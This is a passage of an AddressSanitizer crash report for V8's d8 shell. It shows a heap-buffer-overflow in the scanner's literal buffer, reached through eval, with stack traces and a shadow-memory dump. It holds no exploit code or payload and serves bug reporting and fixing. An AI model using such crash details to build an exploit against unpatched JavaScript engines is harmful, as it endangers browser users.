    #7 0x7f4700530763 in int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)::operator()(unsigned short) const /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:77:0
    #8 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int) std::__Cr::find_if<unsigned short const*, int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int), v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int), int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)) /home/mtowalski/v8/v8/out/x64.release/../../buildtools/third_party/libc++/trunk/include/algorithm:878:0
    #9 0x7f4700530763 in int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:75:0
    #10 0x7f4700530763 in void v8::internal::Scanner::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:599:0
    #11 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:259:0
    #12 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeyword() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:180:0
    #13 0x7f4700530763 in v8::internal::Scanner::ScanSingleToken() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:490:0
    #14 0x7f4700530763 in v8::internal::Scanner::Scan(v8::internal::Scanner::TokenDesc*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:515:0
    #15 0x7f4700530763 in v8::internal::Scanner::Next() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.cc:230:0
    #16 0x7f470048b428 in v8::internal::ParserBase<v8::internal::Parser>::Consume(v8::internal::Token::Value) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:738:36
    #17 0x7f470048b428 in v8::internal::ParserBase<v8::internal::Parser>::ParseVariableDeclarations(v8::internal::ParserBase<v8::internal::Parser>::VariableDeclarationContext, v8::internal::ParserBase<v8::internal::Parser>::DeclarationParsingResult*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:3418:0
    #18 0x7f47003f7864 in v8::internal::ParserBase<v8::internal::Parser>::ParseVariableStatement(v8::internal::ParserBase<v8::internal::Parser>::VariableDeclarationContext, v8::internal::ZoneList<v8::internal::AstRawString const*>*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:4673:3
    #19 0x7f47003d9be3 in v8::internal::ParserBase<v8::internal::Parser>::ParseStatementList(v8::internal::ScopedPtrList<v8::internal::Statement>*, v8::internal::Token::Value) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:4436:23
    #20 0x7f47003d9be3 in v8::internal::Parser::DoParseProgram(v8::internal::Isolate*, v8::internal::ParseInfo*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser.cc:578:0
    #21 0x7f47003d734a in v8::internal::Parser::ParseProgram(v8::internal::Isolate*, v8::internal::ParseInfo*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser.cc:497:29
    #22 0x7f47004a20fc in v8::internal::parsing::ParseProgram(v8::internal::ParseInfo*, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parsing.cc:39:19
    #23 0x7f46ff22ef73 in v8::internal::(anonymous namespace)::CompileToplevel(v8::internal::ParseInfo*, v8::internal::Isolate*, v8::internal::IsCompiledScope*) /home/mtowalski/v8/v8/out/x64.release/../../src/compiler.cc:919:8
    #24 0x7f46ff232517 in v8::internal::Compiler::GetFunctionFromEval(v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Handle<v8::internal::Context>, v8::internal::LanguageMode, v8::internal::ParseRestriction, int, int, int) /home/mtowalski/v8/v8/out/x64.release/../../src/compiler.cc:1393:10
    #25 0x7f4700706007 in v8::internal::CompileGlobalEval(v8::internal::Isolate*, v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::LanguageMode, int, int) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:322:3
    #26 0x7f4700706007 in v8::internal::__RT_impl_Runtime_ResolvePossiblyDirectEval(v8::internal::Arguments, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:353:0
    #27 0x7f4700706007 in v8::internal::Runtime_ResolvePossiblyDirectEval(int, unsigned long*, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:331:0
    #28 0x7f4701054bc5 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit ??:0:0
    #29 0x7f47010956ce in Builtins_CallRuntimeHandler ??:0:0
    #30 0x7f4700fb2bf6 in Builtins_InterpreterEntryTrampoline ??:0:0
    #31 0x7f4700fb029f in Builtins_JSEntryTrampoline ??:0:0
    #32 0x7f4700fb002c in Builtins_JSEntry ??:0:0
    #33 0x7f46ffc09b90 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) /home/mtowalski/v8/v8/out/x64.release/../../src/simulator.h:124:12
    #34 0x7f46ffc09b90 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) /home/mtowalski/v8/v8/out/x64.release/../../src/execution.cc:293:0
    #35 0x7f46ffc08ba4 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) /home/mtowalski/v8/v8/out/x64.release/../../src/execution.cc:369:10
    #36 0x7f46feeca7e3 in v8::Script::Run(v8::Local<v8::Context>) /home/mtowalski/v8/v8/out/x64.release/../../src/api.cc:2135:7
    #37 0x559891d68230 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::Value>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:533:28
    #38 0x559891d84f4b in v8::SourceGroup::Execute(v8::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:2466:10
    #39 0x559891d8bfb3 in v8::Shell::RunMain(v8::Isolate*, int, char**, bool) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:2948:34
    #40 0x559891d90ba6 in v8::Shell::Main(int, char**) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:3500:16
    #41 0x7f46fc7082e0 in __libc_start_main ??:0:0

0x606000001bc0 is located 0 bytes to the right of 64-byte region [0x606000001b80,0x606000001bc0)
allocated by thread T0 here:
    #0 0x559891d53c82 in operator new[](unsigned long, std::nothrow_t const&) _asan_rtl_:3
    #1 0x7f470051627a in unsigned char* v8::internal::NewArray<unsigned char>(unsigned long) /home/mtowalski/v8/v8/out/x64.release/../../src/allocation.h:41:15
    #2 0x7f470051627a in v8::internal::Vector<unsigned char>::New(int) /home/mtowalski/v8/v8/out/x64.release/../../src/vector.h:33:0
    #3 0x7f470051627a in v8::internal::Scanner::LiteralBuffer::ExpandBuffer() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.cc:74:0
    #4 0x7f4700530763 in v8::internal::Scanner::LiteralBuffer::AddOneByteChar(unsigned char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:485:49
    #5 0x7f4700530763 in v8::internal::Scanner::LiteralBuffer::AddChar(char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:425:0
    #6 0x7f4700530763 in v8::internal::Scanner::AddLiteralChar(char) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:577:0
    #7 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)::operator()(int) const /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:273:0
    #8 0x7f4700530763 in int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)::operator()(unsigned short) const /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:77:0
    #9 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int) std::__Cr::find_if<unsigned short const*, int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int), v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int), int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int))::'lambda'(unsigned short)) /home/mtowalski/v8/v8/out/x64.release/../../buildtools/third_party/libc++/trunk/include/algorithm:878:0
    #10 0x7f4700530763 in int v8::internal::Utf16CharacterStream::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:75:0
    #11 0x7f4700530763 in void v8::internal::Scanner::AdvanceUntil<v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)>(v8::internal::Scanner::ScanIdentifierOrKeywordInner()::'lambda'(int)) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.h:599:0
    #12 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeywordInner() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:259:0
    #13 0x7f4700530763 in v8::internal::Scanner::ScanIdentifierOrKeyword() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:180:0
    #14 0x7f4700530763 in v8::internal::Scanner::ScanSingleToken() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:490:0
    #15 0x7f4700530763 in v8::internal::Scanner::Scan(v8::internal::Scanner::TokenDesc*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner-inl.h:515:0
    #16 0x7f4700530763 in v8::internal::Scanner::Next() /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/scanner.cc:230:0
    #17 0x7f470048b428 in v8::internal::ParserBase<v8::internal::Parser>::Consume(v8::internal::Token::Value) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:738:36
    #18 0x7f470048b428 in v8::internal::ParserBase<v8::internal::Parser>::ParseVariableDeclarations(v8::internal::ParserBase<v8::internal::Parser>::VariableDeclarationContext, v8::internal::ParserBase<v8::internal::Parser>::DeclarationParsingResult*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:3418:0
    #19 0x7f47003f7864 in v8::internal::ParserBase<v8::internal::Parser>::ParseVariableStatement(v8::internal::ParserBase<v8::internal::Parser>::VariableDeclarationContext, v8::internal::ZoneList<v8::internal::AstRawString const*>*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:4673:3
    #20 0x7f47003d9be3 in v8::internal::ParserBase<v8::internal::Parser>::ParseStatementList(v8::internal::ScopedPtrList<v8::internal::Statement>*, v8::internal::Token::Value) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser-base.h:4436:23
    #21 0x7f47003d9be3 in v8::internal::Parser::DoParseProgram(v8::internal::Isolate*, v8::internal::ParseInfo*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser.cc:578:0
    #22 0x7f47003d734a in v8::internal::Parser::ParseProgram(v8::internal::Isolate*, v8::internal::ParseInfo*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parser.cc:497:29
    #23 0x7f47004a20fc in v8::internal::parsing::ParseProgram(v8::internal::ParseInfo*, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/parsing/parsing.cc:39:19
    #24 0x7f46ff22ef73 in v8::internal::(anonymous namespace)::CompileToplevel(v8::internal::ParseInfo*, v8::internal::Isolate*, v8::internal::IsCompiledScope*) /home/mtowalski/v8/v8/out/x64.release/../../src/compiler.cc:919:8
    #25 0x7f46ff232517 in v8::internal::Compiler::GetFunctionFromEval(v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::Handle<v8::internal::Context>, v8::internal::LanguageMode, v8::internal::ParseRestriction, int, int, int) /home/mtowalski/v8/v8/out/x64.release/../../src/compiler.cc:1393:10
    #26 0x7f4700706007 in v8::internal::CompileGlobalEval(v8::internal::Isolate*, v8::internal::Handle<v8::internal::String>, v8::internal::Handle<v8::internal::SharedFunctionInfo>, v8::internal::LanguageMode, int, int) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:322:3
    #27 0x7f4700706007 in v8::internal::__RT_impl_Runtime_ResolvePossiblyDirectEval(v8::internal::Arguments, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:353:0
    #28 0x7f4700706007 in v8::internal::Runtime_ResolvePossiblyDirectEval(int, unsigned long*, v8::internal::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/runtime/runtime-compiler.cc:331:0
    #29 0x7f4701054bc5 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvInRegister_NoBuiltinExit ??:0:0
    #30 0x7f47010956ce in Builtins_CallRuntimeHandler ??:0:0
    #31 0x7f4700fb2bf6 in Builtins_InterpreterEntryTrampoline ??:0:0
    #32 0x7f4700fb029f in Builtins_JSEntryTrampoline ??:0:0
    #33 0x7f4700fb002c in Builtins_JSEntry ??:0:0
    #34 0x7f46ffc09b90 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) /home/mtowalski/v8/v8/out/x64.release/../../src/simulator.h:124:12
    #35 0x7f46ffc09b90 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) /home/mtowalski/v8/v8/out/x64.release/../../src/execution.cc:293:0
    #36 0x7f46ffc08ba4 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) /home/mtowalski/v8/v8/out/x64.release/../../src/execution.cc:369:10
    #37 0x7f46feeca7e3 in v8::Script::Run(v8::Local<v8::Context>) /home/mtowalski/v8/v8/out/x64.release/../../src/api.cc:2135:7
    #38 0x559891d68230 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::Value>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:533:28
    #39 0x559891d84f4b in v8::SourceGroup::Execute(v8::Isolate*) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:2466:10
    #40 0x559891d8bfb3 in v8::Shell::RunMain(v8::Isolate*, int, char**, bool) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:2948:34
    #41 0x559891d90ba6 in v8::Shell::Main(int, char**) /home/mtowalski/v8/v8/out/x64.release/../../src/d8.cc:3500:16
    #42 0x7f46fc7082e0 in __libc_start_main ??:0:0

SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/mtowalski/v8/v8/out/x64.release/d8+0x1274ad)
Shadow bytes around the buggy address:
  0x0c0c7fff8320: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff8330: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff8340: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff8350: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x0c0c7fff8360: fa fa fa fa 00 00 00 00 00 00 00 00 fa fa fa fa
=>0x0c0c7fff8370: 00 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa
  0x0c0c7fff8380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff8390: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff83a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff83b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fff83c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==3074==ABORTING

```
